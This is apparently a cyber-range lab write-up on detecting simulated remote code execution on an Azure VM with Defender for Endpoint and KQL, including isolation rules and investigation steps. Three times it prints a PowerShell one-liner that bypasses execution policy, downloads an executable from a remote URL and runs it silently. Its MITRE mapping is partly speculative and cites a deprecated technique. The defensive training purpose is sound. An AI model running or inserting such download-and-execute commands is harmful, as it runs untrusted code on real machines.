# Threat Hunt Report: Remote Code Execution Detection (RCE) & Create Detection Rule 📊🛡️

![image (17)](https://github.com/user-attachments/assets/29728b8d-d5e1-4ce0-b939-d7f0d81d49c5)

## Platforms and Languages Leveraged
- Microsoft Sentinel
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

### Scenario: The Attacker Executes Remote Code on the VM 💻🔓

Imagine an attacker gains access to the VM through a **vulnerability** or a **phishing attack**. Once inside, they execute a **Remote Code Execution (RCE)** command using PowerShell to download and run a malicious payload, in this case, the **7zip installer**.

Here's how the attacker might have carried out the attack:

1. **Initial Access**: The attacker exploited a vulnerability in the system or tricked a user into downloading and running a malicious attachment (e.g., a weaponized PowerShell script disguised as an innocuous file). 🔓

2. **Execution**: After gaining access, the attacker executes the following PowerShell command to download a malicious executable (7zip installer) from a remote server:
   
   ```powershell
   cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
   ```

3. **Payload Execution**: The attacker uses `Invoke-WebRequest` to download the payload from a remote server. After the file is downloaded, the attacker silently installs the application by executing it with the `/S` (silent) flag, ensuring there are no user prompts during the installation. This download and installation are performed under the guise of a legitimate action, making detection more difficult. 💻⚠️

4. **Detection**: The **MDE** system (Microsoft Defender for Endpoint) detects the unusual PowerShell activity (particularly the use of `Invoke-WebRequest` and `Start-Process` in sequence), triggering an alert and activating the **custom detection rule** you set up. 🚨

---

## How We Found the RCE Payload 💥

Our team created a custom detection rule that specifically searched for the execution of PowerShell commands using Invoke-WebRequest and Start-Process—two common commands that attackers use to download and run payloads remotely. The rule was set to trigger if the system saw these commands within a specific time frame. ⏱️

Upon running the detection rule, we identified the following PowerShell command executing on the compromised machine:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

This command triggered the download and installation of a malicious 7zip executable from an external URL. The executable was silently executed with the /S flag, which instructed the installer to run without user intervention (silent installation). 👾

Upon investigation, we determined that the malicious payload had been downloaded to `C:\ProgramData\7z2408-x64.exe` and was automatically executed, likely allowing the attacker to gain remote control of the machine. 🚨

---

## Detection and Response 🛡️

Once the suspicious activity was identified:

### 1. KQL Query to Find the RCE PowerShell Payload 🔍

To detect this type of activity, we used the following KQL query in Microsoft Defender for Endpoint (MDE):

```kusto
DeviceProcessEvents
| where DeviceName == "trce12"
| where AccountName != "system"
| where InitiatingProcessCommandLine has_any ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc
```

This query was designed to look for any PowerShell command that used Invoke-WebRequest to download a file and Start-Process to execute it. Specifically, it captures the activity related to the malicious payload execution, allowing us to detect the attack's presence within the last hour. 🧐

![Screenshot 2025-01-12 173352](https://github.com/user-attachments/assets/cdd76fba-d585-4ecb-8b18-344465e49b45)

---

### Step 3: Create a Detection Rule Specific to Your VM ⚡🛠️

1. **Detection Rule Setup**:
    - We want to focus on **Remote Code Execution** (RCE) specifically for your VM. This rule will only trigger for **your VM** to prevent quarantining others' machines. 🎯

2. **RCE Detection Rule**:
    - We’ll detect any PowerShell script automating the download and installation of a program. Here's the **command** we’ll use to automate the downloading and installation of **7zip**:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

---

### Step 4: Write a KQL Query for Detection 👨‍💻📝

1. **KQL Query**:
    - The query will detect **PowerShell** invoking **Invoke-WebRequest** and optionally **Start-Process**.

```kusto
let VMName = "my-vm-name";
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "Invoke-WebRequest" and InitiatingProcessCommandLine contains "Start-Process"
```

---

### Step 5: Create a Detection Rule Based on the Query 🚨🔔

1. **Detection Rule Settings**:
    - Set the detection rule with the following options:
        - ✅ **Isolate Device**
        - ✅ **Collect Investigation Package**
    - This ensures automatic isolation and investigation when the rule is triggered.

---

### Step 6: Trigger the Detection Rule 🔄⚡

1. **Run the Command**: Execute the PowerShell command to trigger the alert (downloading and installing 7zip).
   
2. **Wait for Logs**: 🕒 Check for logs in the MDE portal. Your VM should be isolated once the detection rule triggers. If you can no longer connect to the VM, it likely means the isolation action took place. 🚷

---

### Step 7: Investigate the Incident 🔍🕵️‍♂️

1. **Navigate to the MDE Portal**:
   - Go to [MDE Portal](https://security.microsoft.com/machines) and find your VM.
   
2. **VM Isolation Status**: 
    - Click on the three-dot menu next to the VM.
    - If isolated, you can release it here. For now, check **Action Center** for the **Investigation Package**.

3. **Review the Investigation Package**: 
    - This package contains a detailed collection of data for incident analysis, including:
        - Process trees
        - File/Registry changes
        - Network connections
        - Event logs
        - Memory dumps

---

### Step 8: Resolve the Alert 🛠️🔒

1. **Assign the Alert to Your User**:
    - Assign the alert related to **your custom detection** to your user account.
    - Resolve the alert once reviewed.

---

### Additional Alerts from Microsoft ⚠️🔔

- Microsoft will also generate **automatic alerts** for suspicious activity beyond your custom detection. 🔍
- Review these alerts regularly within the portal for a more comprehensive view of possible security threats.

---

### TTPs Mapped to MITRE ATT&CK Framework 🛠️🔍

Here’s how the **TTPs mapped to MITRE ATT&CK Framework** can be represented in a **chart**:

| **Tactic**                      | **Technique**                         | **Technique ID** | **Description**                                                            |
|----------------------------------|---------------------------------------|------------------|----------------------------------------------------------------------------|
| **Initial Access**               | Phishing                              | T1566            | The attacker may have used phishing to deliver the malicious payload.       |
| **Execution**                    | Command and Scripting Interpreter     | T1059            | PowerShell was used as the command interpreter to execute the malicious code. |
|                                  | PowerShell                            | T1059.001        | PowerShell was used specifically to run the malicious command.              |
| **Persistence**                  | Create or Modify System Process       | T1543            | The attacker might have used the installer to create or modify system processes, ensuring persistence. |
| **Privilege Escalation**         | Abuse Elevation Control Mechanism     | T1548            | The attacker escalated privileges to execute malicious code with higher-level permissions. |
| **Defense Evasion**              | Obfuscated Files or Information      | T1027            | PowerShell was used to obfuscate the command, making it harder to detect.  |
|                                  | Disable Security Tools                | T1089            | The attacker may have attempted to disable security tools to evade detection. |
| **Collection**                   | Data from Local System                | T1005            | After compromising the system, the attacker might have begun collecting data. |
| **Command and Control**          | Application Layer Protocol           | T1071            | The attacker used HTTP to communicate with a remote server to download the malicious executable. |
| **Exfiltration**                 | Exfiltration Over Command and Control Channel | T1041  | The attacker might have used the command and control channel to exfiltrate data. |
| **Impact**                       | Inhibit System Recovery              | T1490            | The attacker could have inhibited system recovery to maintain access.      |

---

This **MITRE ATT&CK TTP** chart helps illustrate the tactics, techniques, and procedure flow throughout the attack, with each corresponding technique and tactic clearly shown. 

---

### Conclusion 🏁📝

**Response detection and response setup!** 🎉 The VM was investigated, isolated, rule created, block IPAddress, and cleared! 🛡️💪

**Thanks for following this incident response!** Stay secure! 😎💻
